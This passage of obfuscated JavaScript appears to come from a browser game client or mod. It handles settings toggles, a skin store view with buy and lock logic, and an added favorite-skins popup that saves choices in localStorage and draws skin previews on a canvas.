              _0x1ec8b6.og.Ak(_0x1ec8b6.og.Xj);
            } else {
              _0x1ec8b6.Ci.Ge();
            }
          });
        });
        _0x4d3e3d.prototype.ha = function () {
          _0x4d3e3d.parent.prototype.ha.call(this);
          var _0x5e6d36 = _0xe610a0();
          var _0x52449e = undefined;
          switch (_0x31b4a1.Vf.fg(_0x31b4a1.Vf.Yf)) {
            case "false":
              _0x52449e = false;
              break;
            default:
              _0x52449e = true;
          }
          _0x2a4512.prop("checked", _0x52449e);
          _0x5e6d36.Ci.re(_0x52449e);
          var _0x12ca84 = undefined;
          switch (_0x31b4a1.Vf.fg(_0x31b4a1.Vf.Zf)) {
            case "false":
              _0x12ca84 = false;
              break;
            default:
              _0x12ca84 = true;
          }
          _0xd79590.prop("checked", _0x12ca84);
          _0x5e6d36.Ci.oe(_0x12ca84);
          var _0x5f609e = undefined;
          switch (_0x31b4a1.Vf.fg(_0x31b4a1.Vf.Xf)) {
            case "false":
              _0x5f609e = false;
              break;
            default:
              _0x5f609e = true;
          }
          _0x5b2782.prop("checked", _0x5f609e);
          _0x5e6d36.Ij.yl(function () {
            _0x5e7259.toggle(_0x5e6d36.Ij.Hj());
            _0x1db833.toggle(_0x5e6d36.Ij.Hj());
          });
        };
        _0x4d3e3d.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeIn(200);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x4d3e3d.prototype.Hk = function () {
          var _0x1da686 = _0xe610a0();
          _0x1da686.Ci.Ce();
          if (_0x1da686.Go()) {
            _0x42bdbf.show();
          } else {
            _0x42bdbf.hide();
          }
        };
        _0x4d3e3d.prototype.Zh = function () {
          return _0x5b2782.prop("checked");
        };
        return _0x4d3e3d;
      }();
      _0x31b4a1.jk = function () {
        var _0x34986c = $("#store-view-canv");
        var _0x6057ef = $("#skin-description-text");
        var _0x322472 = $("#skin-group-description-text");
        var _0x1c9e20 = $("#store-locked-bar");
        var _0x220ed7 = $("#store-locked-bar-text");
        var _0x2990a2 = $("#store-buy-button");
        var _0x183e48 = $("#store-item-price");
        var _0x3fa7dc = $("#store-groups");
        var _0x5a13f6 = $("#store-view-prev");
        var _0x191765 = $("#store-view-next");
        var _0x28f877 = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.skins.tab"), true);
          var _0x38afe5 = this;
          var _0x33beab = _0xe610a0();
          this.Ho = null;
          this.Io = [];
          this.Jo = {};
          this.Ko = new _0x31b4a1.dm(_0x34986c);
          _0x2990a2.click(function () {
            _0x33beab.Ci.Be();
            _0x38afe5.Lo();
          });
          _0x5a13f6.click(function () {
            _0x33beab.Ci.Be();
            _0x38afe5.Ho.Mo();
          });
          _0x191765.click(function () {
            _0x33beab.Ci.Be();
            _0x38afe5.Ho.No();
          });
        });
        _0x28f877.prototype.ha = function () {
          _0x28f877.parent.prototype.ha.call(this);
          var _0x124e7f = this;
          var _0x39e1ec = _0xe610a0();
          _0x39e1ec.Lc.$b(function () {
            var _0x1c5e23 = _0x39e1ec.Lc.Xb();
            _0x124e7f.Io = [];
            for (var _0x4be695 = 0; _0x4be695 < _0x1c5e23.skinGroupArrayDict.length; _0x4be695++) {
              _0x124e7f.Io.push(new _0x3c7955(_0x124e7f, _0x1c5e23.skinGroupArrayDict[_0x4be695]));
            }
            _0x124e7f.Jo = {};
            for (var _0x505042 = 0; _0x505042 < _0x1c5e23.skinArrayDict.length; _0x505042++) {
              var _0x53140d = _0x1c5e23.skinArrayDict[_0x505042];
              _0x124e7f.Jo[_0x53140d.id] = _0x53140d;
            }
            _0x124e7f.Oo();
          });
          this.Po(false);
          _0x39e1ec.On.zj(function () {
            _0x124e7f.Po(false);
          });
        };
        _0x28f877.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeIn(200);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x28f877.prototype.Hk = function () {
          _0xe610a0().Ci.pe(_0x31b4a1.ge.je._e);
          _0xe610a0().Ci.Ce();
          this.Oo();
          this.Ko.Kf(true);
        };
        _0x28f877.prototype.Bk = function () {
          this.Ko.Kf(false);
        };
        _0x28f877.prototype.Jf = function () {
          this.Ko.Jf();
        };
        _0x28f877.prototype.Nf = function (_0x2547e8, _0x51bc45) {
          this.Ko.Nf();
        };
        _0x28f877.prototype.Oo = function () {
          var _0x391e88 = this;
          var _0x22687b = this;
          var _0x14da6f = _0xe610a0();
          _0x3fa7dc.empty();
          for (var _0x4186f1 = 0; _0x4186f1 < this.Io.length; _0x4186f1++) {
            (function (_0x3c9642) {
              var _0x2e45e4 = _0x391e88.Io[_0x3c9642];
              var _0x37d22e = document.createElement("li");
              _0x3fa7dc.append(_0x37d22e);
              var _0x1acb98 = $(_0x37d22e);
              if (_0x2e45e4.To && _0x2e45e4.To.isCustom) {
                _0x1acb98.css("background-color", "#FFF");
                _0x1acb98.css("color", "#000");
              }
              _0x1acb98.html(_0x2e45e4.Qo());
              _0x1acb98.click(function () {
                _0x14da6f.Ci.Be();
                _0x22687b.Ro(_0x2e45e4);
              });
              _0x2e45e4.So = _0x1acb98;
            })(_0x4186f1);
          }
          if (this.Io.length > 0) {
            var _0x17920c = _0x14da6f.On.rj(_0x31b4a1.tj.sj);
            for (var _0x4186f1 = 0; _0x4186f1 < this.Io.length; _0x4186f1++) {
              var _0x3016ba = this.Io[_0x4186f1];
              for (var _0x3dc28e = _0x3016ba.To.list, _0x3b533b = 0; _0x3b533b < _0x3dc28e.length; _0x3b533b++) {
                if (_0x3dc28e[_0x3b533b] == _0x17920c) {
                  _0x3016ba.Uo = _0x3b533b;
                  this.Ro(_0x3016ba);
                  return;
                }
              }
            }
            this.Ro(this.Io[0]);
          }
        };
        _0x28f877.prototype.Ro = function (_0x365436) {
          var _0x3fc22b = _0xe610a0();
          if (this.Ho !== _0x365436) {
            this.Ho = _0x365436;
            _0x3fa7dc.children().removeClass("pressed");
            if (this.Ho.So) {
              this.Ho.So.addClass("pressed");
            }
            _0x322472.html("");
            if (_0x365436.To != null) {
              var _0xcf5287 = _0x3fc22b.Lc.Xb().textDict[_0x365436.To.description];
              if (_0xcf5287 != null) {
                _0x322472.html(_0x2c22d1.K(_0x2c22d1.I(_0xcf5287)));
              }
            }
            this.Po(true);
          }
        };
        _0x28f877.prototype.Vo = function () {
          if (this.Ho == null) {
            return _0x31b4a1.Si.Ui();
          } else {
            return this.Ho.Wo();
          }
        };
        _0x28f877.prototype.Lo = function () {
          var _0xf0c29a = this;
          var _0x487637 = this.Vo();
          if (_0x487637.Wi()) {
            var _0x2d515a = _0x487637.bc();
            _0xf0c29a.Xo(_0x2d515a);
          }
        };
        _0x28f877.prototype.Xo = function (_0x5af3cf) {
          var _0x21da6d = _0xe610a0();
          var _0x462174 = _0x21da6d.On.Gj(_0x5af3cf, _0x31b4a1.tj.sj);
          if (_0x462174 != null) {
            var _0x22460a = _0x462174.Jj();
            if (!(_0x21da6d.Ij.il() < _0x22460a)) {
              var _0x4c1be6 = _0x21da6d.On.rj(_0x31b4a1.tj.sj);
              var _0x3de518 = _0x21da6d.On.rj(_0x31b4a1.tj.uj);
              var _0x201da0 = _0x21da6d.On.rj(_0x31b4a1.tj.vj);
              var _0x4af794 = _0x21da6d.On.rj(_0x31b4a1.tj.xj);
              var _0x16e0bb = _0x21da6d.On.rj(_0x31b4a1.tj.wj);
              var _0x4cb775 = this.ro(5000);
              _0x21da6d.Ij.Hl(_0x5af3cf, _0x31b4a1.tj.sj, function () {
                _0x4cb775.vo();
                _0x21da6d.og.Ak(_0x21da6d.og.tk);
              }, function (_0x182f0d) {
                _0x21da6d.Ij.Bl(function () {
                  _0x21da6d.On.Fj(_0x4c1be6, _0x31b4a1.tj.sj);
                  _0x21da6d.On.Fj(_0x3de518, _0x31b4a1.tj.uj);
                  _0x21da6d.On.Fj(_0x201da0, _0x31b4a1.tj.vj);
                  _0x21da6d.On.Fj(_0x4af794, _0x31b4a1.tj.xj);
                  _0x21da6d.On.Fj(_0x16e0bb, _0x31b4a1.tj.wj);
                  _0x21da6d.On.Fj(_0x5af3cf, _0x31b4a1.tj.sj);
                  _0x4cb775.vo();
                });
              });
            }
          }
        };
        _0x28f877.prototype.Po = function (_0x173394) {
          var _0x2ed42e = _0xe610a0();
          var _0x8f7214 = _0x2ed42e.On.yj();
          var _0xa86ad2 = this.Vo();
          if (_0xa86ad2.Wi()) {
            var _0x30c261 = _0xa86ad2.bc();
            var _0x4e772a = _0x2ed42e.On.Gj(_0x30c261, _0x31b4a1.tj.sj);
            var _0x4c6e8c = false;
            var _0x28213b = _0x2ed42e.On.Cj(_0x30c261, _0x31b4a1.tj.sj);
            var _0x360025 = true;
            if (typeof _0x2c22d1 === "undefined") {
              window.decoder = {
                H: function (_0x5a1ba5) {
                  return _0x5a1ba5 || "Locked";
                },
                I: function (_0x56f8ef) {
                  return _0x56f8ef || "";
                },
                K: function (_0x14b903) {
                  return _0x14b903 || "";
                }
              };
            }
            $("#add-to-favorites-skin").remove();
            $("#manage-favorites-skin").remove();
            $("#skin-info-text").remove();
            $(".fav-buttons-container").remove();
            $(".favorites-popup").remove();
            if (_0x28213b) {
              _0x1c9e20.hide();
              _0x2990a2.hide();
              _0x59bf14(_0x30c261);
            } else if (_0x4e772a == null || _0x4e772a.Kj()) {
              _0x4c6e8c = true;
              _0x1c9e20.show();
              _0x2990a2.hide();
              _0x220ed7.text(_0x2c22d1.H("index.game.popup.menu.store.locked"));
              if (_0x4e772a != null && _0x4e772a.Kj()) {
                var _0x3d5ffc = _0x2ed42e.Lc.Xb().textDict[_0x4e772a.Em()];
                if (_0x3d5ffc != null) {
                  _0x220ed7.text(_0x2c22d1.I(_0x3d5ffc));
                }
              }
            } else {
              _0x360025 = false;
              _0x1c9e20.hide();
              _0x2990a2.show();
              if (typeof _0x183e48 !== "undefined" && _0x183e48) {
                _0x183e48.html(_0x4e772a.Jj());
              } else if ($("#skin-description").length > 0) {
                $("#skin-description").html(_0x4e772a.Jj());
              }
            }
            var _0x574d03 = $("<div class='favorites-popup' style='display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1e1e2f;border:1px solid #333345;border-radius:8px;padding:0;width:450px;max-height:400px;overflow:hidden;z-index:999999;box-shadow:0 8px 32px rgba(0,0,0,0.6);color:white;'><div style='padding:15px 20px;background-color:#252538;border-bottom:1px solid #333345;position:relative;display:flex;justify-content:space-between;align-items:center;'><button class='close-favorites' style='position:absolute;top:8px;left:10px;font-size:22px;background:none;border:none;color:#aaa;cursor:pointer;padding:0 5px;line-height:1;font-weight:bold;transition:color 0.2s ease;'>&times;</button><h3 style='margin:0 0 0 5px;font-size:18px;color:white;padding-left:15px;'>Favorite Skins</h3><button class='clear-all-favorites' style='padding:4px 8px;background-color:#f44336;color:white;border:none;border-radius:4px;cursor:pointer;font-size:12px;transition:background-color 0.2s ease;'>Clear All</button></div><div class='favorites-content' style='padding:15px 20px;overflow-y:auto;max-height:330px;'><div class='favorites-grid' style='display:grid;grid-template-columns:1fr 1fr;gap:15px;padding:0;margin:0;'></div></div></div>");
            $("body").append(_0x574d03);
            _0x20bf2d();
            _0x6057ef.html("");
            var _0x4703e6 = _0x2ed42e.Lc.Xb().textDict[_0x4e772a.Fm()];
            var _0x3bbc8a = _0x4703e6 ? _0x2c22d1.K(_0x2c22d1.I(_0x4703e6)) : _0x4e772a.Fm();
            if (_0x4e772a != null && _0x4e772a.Fm() != null) {
              _0x6057ef.html(_0x3bbc8a);
            }
            this.Ko.$l(_0x8f7214.Um(_0x30c261));
            this.Ko.um(_0x4c6e8c);
            if (_0x173394) {
              _0x2ed42e.On.Fj(_0x30c261, _0x31b4a1.tj.sj);
            }
          }
        };
        function _0x59bf14(_0x2e4d0d) {
          var _0xb82fa7 = $(".store-left");
          if (_0xb82fa7.length === 0) {
            _0xb82fa7 = $("body");
            console.warn("⚠️ store-left not found, using body as fallback");
          }
          if ($("#add-to-favorites-skin").length === 0) {
            var _0x12eb09 = $("<div class='fav-buttons-container' style='margin:10px 0;display:flex;gap:8px;position:relative;z-index:99999;padding:0;'></div>");
            var _0x22e9cd = $("<button id='add-to-favorites-skin' class='favorite-button' style='background:#4CAF50;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;white-space:nowrap;box-shadow:0 2px 6px rgba(0,0,0,0.3);font-size:13px;font-weight:500;transition:all 0.2s ease;'><span style='font-size:14px;margin-right:4px;'>★</span> Add</button>");
            var _0x2bd7a4 = $("<button id='manage-favorites-skin' class='favorite-button' style='background:#2196F3;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;white-space:nowrap;box-shadow:0 2px 6px rgba(0,0,0,0.3);font-size:13px;font-weight:500;transition:all 0.2s ease;'><span style='font-size:14px;margin-right:4px;'>☰</span> Favorite</button>");
            _0x22e9cd.on("mouseenter", function () {
              $(this).css("transform", "translateY(-1px)").css("box-shadow", "0 4px 8px rgba(0,0,0,0.4)");
            }).on("mouseleave", function () {
              $(this).css("transform", "translateY(0)").css("box-shadow", "0 2px 6px rgba(0,0,0,0.3)");
            });
            _0x2bd7a4.on("mouseenter", function () {
              $(this).css("transform", "translateY(-1px)").css("box-shadow", "0 4px 8px rgba(0,0,0,0.4)");
            }).on("mouseleave", function () {
              $(this).css("transform", "translateY(0)").css("box-shadow", "0 2px 6px rgba(0,0,0,0.3)");
            });
            _0x12eb09.append(_0x22e9cd);
            _0x12eb09.append(_0x2bd7a4);
            _0xb82fa7.append(_0x12eb09);
            var _0x356dc6 = $("<div>").attr("id", "skin-info-text").css({
              "font-size": "11px",
              color: "#999",
              margin: "5px 0 10px 0",
              "text-align": "center",
              position: "relative",
              "z-index": "99999"
            }).text("Press '1' key during gameplay to cycle through favorite skins");
            _0xb82fa7.append(_0x356dc6);
            var _0xee5267 = vps.favoriteSkins.indexOf(_0x2e4d0d) !== -1;
            if (_0xee5267) {
              _0x22e9cd.html("<span style=\"font-size:14px;margin-right:4px;\">✖</span> Remove").css("background-color", "#f44336");
            } else {
              _0x22e9cd.html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
            }
            _0x578c56(_0x2e4d0d, _0x22e9cd, _0x2bd7a4);
          }
        }
        function _0x20bf2d() {
          $(document).off("click", ".close-favorites").on("click", ".close-favorites", function () {
            $(this).css("color", "#fff");
            $(".favorites-popup").fadeOut(200);
          });
          $(document).off("mouseenter mouseleave", ".close-favorites").on("mouseenter", ".close-favorites", function () {
            $(this).css("color", "#fff");
          }).on("mouseleave", ".close-favorites", function () {
            $(this).css("color", "#aaa");
          });
          $(document).off("mouseenter mouseleave", ".clear-all-favorites").on("mouseenter", ".clear-all-favorites", function () {
            $(this).css("background-color", "#d32f2f");
          }).on("mouseleave", ".clear-all-favorites", function () {
            $(this).css("background-color", "#f44336");
          });
          $(document).off("mouseup.favorites").on("mouseup.favorites", function (_0x275375) {
            var _0x212001 = $(".favorites-popup");
            if (!_0x212001.is(_0x275375.target) && _0x212001.has(_0x275375.target).length === 0) {
              _0x212001.fadeOut(200);
            }
          });
          $(document).off("click", ".clear-all-favorites").on("click", ".clear-all-favorites", function () {
            if (confirm("Are you sure you want to remove all favorite skins?")) {
              vps.favoriteSkins = [];
              vps.skinr = {};
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x418901();
              var _0x3b2307 = $("#add-to-favorites-skin");
              if (_0x3b2307.length > 0) {
                _0x3b2307.html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
              }
            }
          });
        }
        function _0x578c56(_0x180583, _0x77d933, _0x53f854) {
          _0x77d933.off("click").on("click", function () {
            if (!vps.favoriteSkins) {
              vps.favoriteSkins = [];
            }
            if (!vps.skinr) {
              vps.skinr = {};
            }
            var _0x4072b5 = vps.favoriteSkins.indexOf(_0x180583) !== -1;
            if (!_0x4072b5) {
              vps.favoriteSkins.push(_0x180583);
              vps.skinr[_0x180583] = "Skin " + _0x180583;
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              $(this).html("<span style=\"font-size:14px;margin-right:4px;\">✖</span> Remove").css("background-color", "#f44336");
            } else {
              var _0xcaddc2 = vps.favoriteSkins.indexOf(_0x180583);
              vps.favoriteSkins.splice(_0xcaddc2, 1);
              delete vps.skinr[_0x180583];
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              $(this).html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
            }
          });
          _0x53f854.off("click").on("click", function () {
            _0x418901();
            $(".favorites-popup").fadeIn(200);
          });
        }
        function _0x418901() {
          var _0x347a3a = $(".favorites-grid");
          _0x347a3a.empty();
          if (!vps.favoriteSkins) {
            vps.favoriteSkins = [];
          }
          if (vps.favoriteSkins.length > 0) {
            for (var _0x24374a = 0; _0x24374a < vps.favoriteSkins.length; _0x24374a++) {
              var _0x4ebd38 = vps.favoriteSkins[_0x24374a];
              var _0x64df3b = $("<div>").attr("data-index", _0x24374a).attr("data-skin-id", _0x4ebd38).css({
                display: "flex",
                "flex-direction": "column",
                "align-items": "center",
                padding: "2px",
                background: "#252538",
                "border-radius": "6px",
                position: "relative",
                height: "50px",
                width: "100%",
                border: "1px solid #333345"
              });
              var _0xd6ff65 = $("<div>").css({
                width: "100%",
                height: "46px",
                background: "transparent",
                "border-radius": "4px",
                overflow: "visible",
                position: "relative",
                display: "flex",
                "justify-content": "center",
                "align-items": "center"
              }).appendTo(_0x64df3b);
              var _0x5766eb = $("<button>").text("X").css({
                position: "absolute",
                top: "3px",
                right: "3px",
                background: "#f44336",
                color: "white",
                border: "none",
                padding: "1px 5px",
                "border-radius": "3px",
                cursor: "pointer",
                "font-size": "11px",
                "z-index": "20"
              }).appendTo(_0x64df3b);
              var _0x16af3c = _0x47f3aa(_0x4ebd38);
              _0xd6ff65.append(_0x16af3c);
              _0x347a3a.append(_0x64df3b);
              _0x5766eb.off("click").on("click", function (_0x1d5adf) {
                _0x1d5adf.stopPropagation();
                var _0x45d9b2 = $(this).closest("[data-index]");
                var _0x35bc5b = parseInt(_0x45d9b2.attr("data-index"));
                var _0x1cb00d = _0x45d9b2.attr("data-skin-id");
                vps.favoriteSkins.splice(_0x35bc5b, 1);
                if (vps.skinr && vps.skinr[_0x1cb00d]) {
                  delete vps.skinr[_0x1cb00d];
                }
                localStorage.setItem("SaveGamewup", JSON.stringify(vps));
                _0x45d9b2.fadeOut(300, function () {
                  $(this).remove();
                  _0x347a3a.find("[data-index]").each(function (_0x5bf628) {
                    $(this).attr("data-index", _0x5bf628);
                  });
                  if (vps.favoriteSkins.length === 0) {
                    _0xf001e5(_0x347a3a);
                  }
                });
                var _0x2e900e = $("#add-to-favorites-skin");
                if (_0x2e900e.length > 0) {
                  _0x2e900e.html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
                }
              });
            }
          } else {
            _0xf001e5(_0x347a3a);
          }
        }
        function _0xf001e5(_0x2c448e) {
          _0x2c448e.append("<div style='text-align:center;padding:10px;color:#aaa;margin:20px 0;grid-column:1/span 2;'>You don't have any favorite skins yet.</div>");
        }
        function _0x47f3aa(_0x57eb58) {
          if (!window.textureCache) {
            window.textureCache = {};
          }
          try {
            var _0x2151f4 = JSON.parse(localStorage.getItem("wup_config"));
            if (!_0x2151f4) {
              console.warn("❌ wup_config not found in localStorage");
              return _0x51f28a(_0x57eb58);
            }
            var _0x567aa3 = null;
            if (_0x2151f4.skinArrayDict && Array.isArray(_0x2151f4.skinArrayDict)) {
              _0x567aa3 = _0x2151f4.skinArrayDict.find(function (_0x2c7310) {
                return _0x2c7310 && _0x2c7310.id === _0x57eb58;
              });
            }
            if (!_0x567aa3) {
              console.warn("⚠️ Skin " + _0x57eb58 + " not found in wup_config");
              return _0x51f28a(_0x57eb58);
            }
            var _0x2db228 = document.createElement("div");
            _0x2db228.style.cssText = "width: 100%;height: 100%;position: relative;overflow: visible;background: transparent;";
            var _0x10b0c0 = document.createElement("div");
            _0x10b0c0.textContent = "#" + _0x57eb58;
            _0x10b0c0.style.cssText = "position: absolute;top: 3px;left: 2px;background-color: rgba(0,0,0,0.6);color: white;font-size: 11px;padding: 1px 4px;border-radius: 3px;z-index: 10;";
            _0x2db228.appendChild(_0x10b0c0);
            var _0x36d13e = document.createElement("canvas");
            _0x36d13e.width = 600;
            _0x36d13e.height = 80;
            _0x36d13e.style.cssText = "position: absolute;top: 0;left: 0;width: 100%;height: 100%;object-fit: contain;padding: 5px;";
            _0x2db228.appendChild(_0x36d13e);
            var _0x591887 = _0x36d13e.getContext("2d");
            _0x591887.clearRect(0, 0, _0x36d13e.width, _0x36d13e.height);
            if (_0x567aa3.base && Array.isArray(_0x567aa3.base) && _0x567aa3.base.length > 0) {
              var _0x4faeff = {};
              var _0x56defd = [];
              _0x567aa3.base.forEach(function (_0x2297fe) {
                if (!_0x2297fe) {
                  return;
                }
                if (_0x2151f4.regionDict && _0x2151f4.regionDict[_0x2297fe]) {
                  var _0x5448d6 = _0x2151f4.regionDict[_0x2297fe];
                  if (_0x2151f4.textureDict && _0x5448d6.texture && _0x2151f4.textureDict[_0x5448d6.texture]) {
                    var _0x5cad02 = _0x2151f4.textureDict[_0x5448d6.texture];
                    if (_0x5cad02 && (_0x5cad02.file || _0x5cad02.relativePath)) {
                      var _0x5a84cd = _0x1b576d(_0x5cad02.relativePath || _0x5cad02.file);
                      if (!_0x4faeff[_0x5a84cd]) {
                        _0x4faeff[_0x5a84cd] = [];
                      }
                      _0x4faeff[_0x5a84cd].push({
                        id: _0x2297fe,
                        region: _0x5448d6
                      });
                      _0x56defd.push({
                        id: _0x2297fe,
                        region: _0x5448d6
                      });
                    }
                  }
                }
              });
              var _0x1671b5 = _0x56defd.slice().reverse();
              var _0x18fca8 = _0x1671b5.slice();
              while (_0x18fca8.length < 27) {
                var _0x45686f = 27 - _0x18fca8.length;
                var _0x620687 = _0x1671b5.slice(0, Math.min(_0x45686f, _0x1671b5.length));
                _0x18fca8 = _0x18fca8.concat(_0x620687);
              }
              var _0x2f3b75 = 80;
              var _0x1a4de5 = _0x2f3b75 / 2;
              var _0x5f1332 = 0.2;
              var _0x44482d = _0x2f3b75 * _0x5f1332 * _0x18fca8.length + _0x2f3b75 * 0.75;
              _0x36d13e.width = Math.max(600, _0x44482d);
              _0x591887.clearRect(0, 0, _0x36d13e.width, _0x36d13e.height);
              var _0x4ac77d = 0;
              var _0x57af30 = Object.keys(_0x4faeff).length;
              function _0x15ace9(_0x15b10d) {
                var _0x40eb58 = _0x36d13e.height / 2;
                _0x18fca8.forEach(function (_0x311f6a, _0x43eaff) {
                  if (!_0x311f6a) {
                    return;
                  }
                  var _0x39e8b9 = _0x311f6a.region;
                  var _0x5d26ed = _0x1a4de5 + _0x43eaff * _0x1a4de5 * 2 * _0x5f1332;
                  _0x591887.save();
                  _0x591887.beginPath();
                  _0x591887.arc(_0x5d26ed, _0x40eb58, _0x1a4de5, 0, Math.PI * 2);
                  _0x591887.clip();
                  var _0x4e01eb = Math.max(_0x39e8b9.w, _0x39e8b9.h);
                  var _0x469913 = _0x1a4de5 * 2 / _0x4e01eb;
                  var _0x77dc53 = _0x5d26ed - _0x39e8b9.w * _0x469913 / 2;
                  var _0x3015be = _0x40eb58 - _0x39e8b9.h * _0x469913 / 2;
                  _0x591887.drawImage(_0x15b10d, _0x39e8b9.x, _0x39e8b9.y, _0x39e8b9.w, _0x39e8b9.h, _0x77dc53, _0x3015be, _0x39e8b9.w * _0x469913, _0x39e8b9.h * _0x469913);
                  _0x591887.restore();
                });
              }
              Object.keys(_0x4faeff).forEach(function (_0x2305cf) {
                if (window.textureCache[_0x2305cf]) {
                  _0x15ace9(window.textureCache[_0x2305cf]);
                  return;
                }
                var _0x3c6113 = new Image();
                _0x3c6113.crossOrigin = "anonymous";
                _0x3c6113.onload = function () {
                  window.textureCache[_0x2305cf] = _0x3c6113;
                  _0x15ace9(_0x3c6113);
                  _0x4ac77d++;
                };
                _0x3c6113.onerror = function () {
                  console.warn("❌ Failed to load texture:", _0x2305cf);
                  _0x4ac77d++;
                };
                _0x3c6113.src = _0x2305cf;
              });
            } else {
              console.warn("⚠️ No base textures found for skin", _0x57eb58);
              _0x591887.fillStyle = "#ff6b6b";
              _0x591887.fillRect(10, 20, 580, 40);
              _0x591887.fillStyle = "#fff";
              _0x591887.font = "14px Arial";
              _0x591887.textAlign = "center";
              _0x591887.fillText("Skin #" + _0x57eb58, _0x36d13e.width / 2, _0x36d13e.height / 2 + 5);
            }
            return _0x2db228;
          } catch (_0x3b0e11) {
            console.error("❌ Error creating skin texture view:", _0x3b0e11);
            return _0x51f28a(_0x57eb58);
          }
        }
        function _0x51f28a(_0x165d5f) {
          var _0x14d3ff = document.createElement("div");
          _0x14d3ff.style.cssText = "width: 100%;height: 100%;display: flex;justify-content: center;align-items: center;color: white;background-color: #333;border-radius: 4px;font-size: 12px;";
          _0x14d3ff.textContent = "🎮 #" + _0x165d5f;
          return _0x14d3ff;
        }
        function _0x1b576d(_0x1510a6) {
          if (!_0x1510a6) {
            return "";
          }
          if (_0x1510a6.startsWith("data:") || _0x1510a6.startsWith("http")) {
            return _0x1510a6;
          }
          var _0x6c53b0 = window.vps.s_l;
          if (_0x1510a6.startsWith("/")) {
            return _0x6c53b0 + _0x1510a6;
          } else {
            return _0x6c53b0 + "/" + _0x1510a6;
          }
        }
        var _0x3c7955 = function () {
          function _0x5834a2(_0x4aa62b, _0x513724) {
            this.Yo = _0x4aa62b;
            this.Uo = 0;
            this.To = _0x513724;
          }
          _0x5834a2.prototype.Mo = function () {
            if (--this.Uo < 0) {
              this.Uo = this.To.list.length - 1;
            }
            this.Yo.Po(true);
          };
          _0x5834a2.prototype.No = function () {
            if (++this.Uo >= this.To.list.length) {
              this.Uo = 0;
            }
            this.Yo.Po(true);
          };
          _0x5834a2.prototype.Qo = function () {
            if (this.To.img) {
              try {
                var _0x323304 = "";
                var _0x205678 = [];
                var _0x401ca2 = null;
                try {
                  _0x401ca2 = _0xe610a0().Lc.Xb().customPaths;
                } catch (_0x1d30f4) {
                  _0x401ca2 = null;
                }
                if (_0x401ca2 && _0x401ca2.texture && _0x401ca2.map && _0x401ca2.map[this.To.img]) {
                  _0x323304 = window.vps.s_l + "/images/" + _0x401ca2.texture;
                  _0x205678.push("background-image:url('" + _0x323304 + "')");
                  _0x205678.push("background-position: -" + _0x401ca2.map[this.To.img].x + "px -" + _0x401ca2.map[this.To.img].y + "px");
                  _0x205678.push("background-repeat:no-repeat");
                } else {
                  _0x323304 = window.vps.s_l + "/images/" + this.To.img;
                  _0x205678.push("background-image:url('" + _0x323304 + "')");
                  _0x205678.push("background-position: center");
                  _0x205678.push("background-repeat: no-repeat");
                  _0x205678.push("background-size: contain");
                }
                _0x205678.push("width: 180px");
                _0x205678.push("height: 40px");
                _0x205678.push("background-color: #26c6da");
                return "<div id=\"" + this.To.id + "\" style=\"" + _0x205678.join(";") + "\"></div>";
              } catch (_0x2e368f) {
                console.error("Error in Qo function:", _0x2e368f);
                console.error("Image path:", this.To.img);
                return _0x2c22d1.I(this.To.name);
              }
            }
            return _0x2c22d1.I(this.To.name);
          };
          _0x5834a2.prototype.Wo = function () {
            if (this.Uo >= this.To.list.length) {
              return _0x31b4a1.Si.Ui();
            } else {
              return _0x31b4a1.Si.Vi(this.To.list[this.Uo]);
            }
          };
          return _0x5834a2;
        }();
        return _0x28f877;
      }();
      _0x31b4a1.lk = function () {
        var _0x13c29e = $("#store-go-coins-button");
        var _0x87f05e = $("#store-go-skins-button");
        var _0x21ac49 = $("#store-go-wear-button");
        var _0xdac43 = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.store.tab"), true);
          var _0x1c1e7b = _0xe610a0();
          _0x13c29e.click(function () {
            _0x1c1e7b.Ci.Be();
